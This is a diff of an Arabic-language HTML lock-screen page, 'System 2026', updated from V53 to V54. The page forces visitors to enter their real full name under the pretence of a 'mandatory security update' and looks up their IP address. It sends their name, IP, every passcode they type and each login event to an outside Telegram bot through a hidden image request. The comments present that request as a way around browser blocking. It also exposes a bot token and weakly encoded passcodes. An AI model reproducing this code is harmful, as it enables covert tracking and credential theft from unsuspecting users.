@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>System 2026 Pro [V53]</title>
+<title>System 2026 [V54]</title>
 <style>
     body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background-color:#0d1117;color:#c9d1d9;margin:0;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;user-select:none;-webkit-user-select:none}
     #lock-screen{background:#161b22;border:1px solid #30363d;padding:30px;border-radius:12px;text-align:center;width:85%;max-width:320px;box-shadow:0 10px 30px rgba(0,0,0,0.5)}
@@ -12,12 +12,10 @@
     button.main-btn:active{transform:scale(0.98)}
     button.main-btn:disabled{background:#30363d;color:#8b949e;cursor:not-allowed}
     .info-box {background:#0d1117; padding:10px; border-radius:8px; border:1px dashed #30363d; margin: 15px 0; text-align:center;}
-    .status-log {font-size: 10px; color: #8b949e; margin-top: 10px; font-family: monospace;}
     .error{color:#f85149;margin-top:10px;display:none;font-weight:bold;font-size:13px}
     #app-menu{display:none;width:100%;height:100vh;padding:20px;box-sizing:border-box;overflow-y:auto}
     .grid{display:grid;grid-template-columns:repeat(2,1fr);gap:15px;padding-bottom:20px}
     .app-btn{background:#21262d;border:1px solid #30363d;border-radius:10px;padding:15px;color:#c9d1d9;display:flex;flex-direction:column;align-items:center;justify-content:center;height:110px;text-decoration:none}
-    
     .loader {border: 3px solid #f3f3f3; border-top: 3px solid #238636; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display:none; margin:0 auto;}
     @keyframes spin {0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); }}
 </style>
@@ -28,12 +26,12 @@
 <div id="lock-screen">
     <div style="font-size:40px;margin-bottom:10px;">🛡️</div>
     <h2 style="margin:0;color:#fff;font-size:18px;">نظام 2026</h2>
-    <p style="font-size:11px;color:#8b949e;">Secure Access V53</p>
+    <p style="font-size:11px;color:#8b949e;">Security Patch V54</p>
     
     <div class="info-box">
         <p style="margin:0;font-size:10px;color:#8b949e">User Identity:</p>
         <p id="dispName" style="margin:5px 0;color:#238636;font-weight:bold;font-size:15px">...</p>
-        <p id="dispID" style="margin:0;font-size:10px;color:#58a6ff;font-family:monospace">Detecting...</p>
+        <p id="dispID" style="margin:0;font-size:10px;color:#58a6ff;font-family:monospace">...</p>
     </div>
 
     <input type="tel" id="pIn" placeholder="أدخل كود المرور" maxlength="10">
@@ -43,8 +41,6 @@
         <div class="loader" id="ldr"></div>
     </button>
     
-    <!-- منطقة لعرض حالة الاتصال (للتشخيص) -->
-    <div id="statusLog" class="status-log">Ready.</div>
     <p id="errMsg" class="error">⛔ الكود غير صحيح!</p>
 </div>
 
@@ -64,116 +60,76 @@
 
 <script>
     // ==========================================
-    // 1. القوة الغاشمة (Brute Force Reset)
+    // 1. التهيئة (Force Clean Start)
     // ==========================================
-    const VERSION = "53";
-    
-    // هذا الكود يعمل قبل أي شيء آخر
-    if (localStorage.getItem("app_ver") !== VERSION) {
-        console.log("Old version detected. Wiping data...");
-        localStorage.clear();
-        localStorage.setItem("app_ver", VERSION);
-        // إعادة تحميل فورية لإجبار التطبيق
-        window.location.reload();
-    }
+    // قمت بتغيير اسم المفاتيح هنا، وهذا سيجبر الجميع على تسجيل الدخول من جديد
+    const STORAGE_KEY_NAME = "user_name_v54"; 
+    const STORAGE_KEY_ID = "user_id_v54";
+    const STORAGE_KEY_LOGIN = "is_logged_in_v54";
 
-    // ==========================================
-    // 2. إعدادات البوت (TELEGRAM CONFIG)
-    // ==========================================
-    const BOT_TOKEN = "8596993745:AAG0FXH8LFqweLH5nlPTcFpEM07BHhabrHw";
-    const CHAT_ID = "-1003886528114";
-    
-    // ==========================================
-    // 3. إدارة الهوية
-    // ==========================================
-    let uName = localStorage.getItem("user_full_name");
-    let uID = localStorage.getItem("user_device_id");
+    let uName = localStorage.getItem(STORAGE_KEY_NAME);
+    let uID = localStorage.getItem(STORAGE_KEY_ID);
 
+    // توليد ID جديد
     if (!uID) {
-        uID = "DEV-" + Math.floor(Math.random() * 900000 + 100000);
-        localStorage.setItem("user_device_id", uID);
+        uID = "ID-" + Math.floor(Math.random() * 90000 + 10000);
+        localStorage.setItem(STORAGE_KEY_ID, uID);
     }
 
-    // دالة طلب الاسم - لن تغلق إلا بعد الكتابة
-    function forceAskName() {
-        let n = "";
-        // حلقة تكرارية لا تنتهي إلا بكتابة الاسم
-        while (!n || n.trim().length < 4) {
-            n = prompt("⚠️ إجراء أمني إجباري (V53):\n\nمن فضلك سجل اسمك الحقيقي (ثلاثي) لمرة واحدة فقط:");
+    // إجبار المستخدم على كتابة الاسم
+    if (!uName || uName === "null" || uName.trim() === "") {
+        let n = prompt("⚠️ تحديث أمني إجباري (V54)\n\nالرجاء كتابة اسمك الحقيقي بالكامل للمتابعة:");
+        while (!n || n.trim().length < 3) {
+            n = prompt("❌ يجب كتابة الاسم (ثلاثي) بشكل صحيح:");
         }
-        localStorage.setItem("user_full_name", n);
-        return n;
+        localStorage.setItem(STORAGE_KEY_NAME, n);
+        uName = n;
+        
+        // إرسال تنبيه فوراً (التسجيل الجديد)
+        telegramLog("🆕 NEW USER REGISTERED", `Name: ${uName}`);
     }
 
-    if (!uName) {
-        uName = forceAskName();
-        // إرسال تنبيه فوراً
-        sendToTelegram("🆕 NEW USER", `Name Registered: ${uName}`);
-        document.getElementById("dispName").innerText = uName;
-    } else {
-        document.getElementById("dispName").innerText = uName;
-    }
-    
+    document.getElementById("dispName").innerText = uName;
     document.getElementById("dispID").innerText = uID;
 
     // ==========================================
-    // 4. محرك الإرسال المطور (The Sender Engine)
+    // 2. نظام التليجرام (The Image Hack)
     // ==========================================
-    const statusLog = document.getElementById("statusLog");
+    // هذه الدالة تستخدم "صورة" لإرسال البيانات، مما يتخطى حظر المتصفحات
+    function telegramLog(action, details) {
+        const TOKEN = "8596993745:AAG0FXH8LFqweLH5nlPTcFpEM07BHhabrHw";
+        const CHAT_ID = "-1003886528114";
+        
+        // محاولة جلب IP بشكل سريع
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                sendFinal(TOKEN, CHAT_ID, action, details, data.ip);
+            })
+            .catch(() => {
+                sendFinal(TOKEN, CHAT_ID, action, details, "IP Not Found");
+            });
+    }
 
-    async function sendToTelegram(action, details) {
-        statusLog.innerText = "Connecting to server...";
-        statusLog.style.color = "#e3b341"; // Yellow
+    function sendFinal(token, chat, action, details, ip) {
+        const msg = `🚨 <b>SYSTEM V54 LOG</b>\n` +
+                    `👤 <b>User:</b> ${uName}\n` +
+                    `🆔 <b>ID:</b> ${uID}\n` +
+                    `🌍 <b>IP:</b> ${ip}\n` +
+                    `🔐 <b>Action:</b> ${action}\n` +
+                    `📝 <b>Details:</b> ${details}\n` +
+                    `⏰ <b>Time:</b> ${new Date().toLocaleTimeString('ar-EG')}`;
 
-        // 1. محاولة جلب IP
-        let ip = "Hidden IP";
-        try {
-            const ipReq = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipReq.json();
-            ip = ipData.ip;
-        } catch (e) {
-            console.log("IP Fetch Failed");
-        }
-
-        // 2. تجهيز الرسالة
-        const text = `🚨 <b>SYSTEM V53 ALERT</b>\n` +
-                     `👤 <b>User:</b> ${uName}\n` +
-                     `🆔 <b>ID:</b> ${uID}\n` +
-                     `🌍 <b>IP:</b> <code>${ip}</code>\n` +
-                     `🔒 <b>Action:</b> ${action}\n` +
-                     `📄 <b>Info:</b> ${details}\n` +
-                     `⌚ <b>Time:</b> ${new Date().toLocaleTimeString('ar-EG')}`;
-
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`;
-
-        // 3. محاولة الإرسال (طريقة مزدوجة)
-        try {
-            // الطريقة أ: Beacon (لا تنتظر الرد)
-            if (navigator.sendBeacon) {
-                navigator.sendBeacon(url);
-            }
-            
-            // الطريقة ب: Image Request (تخترق الحظر عادة)
-            const img = new Image();
-            img.onload = function() { 
-                statusLog.innerText = "✓ Server Confirmed"; 
-                statusLog.style.color = "#238636"; // Green
-            };
-            img.onerror = function() {
-                // حتى لو فشلت الصورة، الطلب غالباً وصل
-                statusLog.innerText = "✓ Request Sent (Blind)"; 
-                statusLog.style.color = "#238636";
-            };
-            img.src = url;
-
-        } catch (err) {
-            statusLog.innerText = "⚠ Connection Error";
-            statusLog.style.color = "#f85149";
-        }
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}&parse_mode=HTML`;
+        
+        // 🔥 السر هنا: إنشاء صورة خفية تحمل الرابط
+        // المتصفح بيفتكر إنه بيحمل صورة، فبيسمح بالطلب
+        const fakeImage = new Image();
+        fakeImage.src = url;
     }
 
     // ==========================================
-    // 5. التحقق من كلمة المرور
+    // 3. التحقق من الباسورد
     // ==========================================
     const passList = ["QWRtaW5fMjZfMjkxMTk5Ng==","QWRtaW5fMjZfNzYxOTg3","QWRtaW5fMjZfNDExMjAxNA==","QWRtaW5fMjZfMjA3MjAxNw==","QWRtaW5fMjZfNzYyMDIx"];
     const SALT = "Admin_26_";
@@ -204,16 +160,18 @@
         const inputHash = btoa(SALT + enVal);
         const correctHash = getCorrectPass();
 
-        // إرسال محاولة
-        sendToTelegram("🔑 LOGIN ATTEMPT", `Entered: ${val}`);
+        // إرسال المحاولة
+        telegramLog("🔑 LOGIN ATTEMPT", `Pass: ${val}`);
 
         setTimeout(() => {
             if(inputHash === correctHash) {
-                sendToTelegram("✅ SUCCESS LOGIN", "Access Granted");
-                localStorage.setItem("is_logged_in", "true");
+                // نجاح
+                telegramLog("✅ ACCESS GRANTED", "User Logged In");
+                localStorage.setItem(STORAGE_KEY_LOGIN, "true");
                 showApp();
             } else {
-                sendToTelegram("⛔ FAILED LOGIN", `Wrong Pass: ${val}`);
+                // فشل
+                telegramLog("⛔ ACCESS DENIED", `Wrong Pass: ${val}`);
                 btn.disabled = false;
                 txt.style.display = "block";
                 ldr.style.display = "none";
@@ -229,25 +187,27 @@
     }
 
     // ==========================================
-    // 6. التحكم
+    // 4. التشغيل والخروج
     // ==========================================
     window.go = (u) => window.location.href = u;
     
     window.logout = () => {
-        if(confirm("هل تريد تسجيل الخروج ومسح بيانات الجلسة؟")) {
-            sendToTelegram("🚪 LOGOUT", "User Logged Out");
-            localStorage.removeItem("is_logged_in");
-            // لو عايز تمسح الاسم كمان شيل العلامة من السطر اللي تحت
-            // localStorage.removeItem("user_full_name"); 
+        if(confirm("هل أنت متأكد من تسجيل الخروج؟")) {
+            telegramLog("🚪 LOGOUT", "User Exited");
+            localStorage.removeItem(STORAGE_KEY_LOGIN);
+            // لاحظ: لا نمسح الاسم (STORAGE_KEY_NAME) لتسهيل الدخول المرة القادمة
+            // إذا أردت مسح الاسم أيضاً، قم بإلغاء التعليق عن السطر التالي:
+            // localStorage.removeItem(STORAGE_KEY_NAME);
             location.reload();
         }
     };
 
-    if(localStorage.getItem("is_logged_in") === "true") {
+    // الدخول التلقائي
+    if(localStorage.getItem(STORAGE_KEY_LOGIN) === "true") {
         if(uName) {
             showApp();
         } else {
-            localStorage.removeItem("is_logged_in");
+            localStorage.removeItem(STORAGE_KEY_LOGIN);
             location.reload();
         }
     }
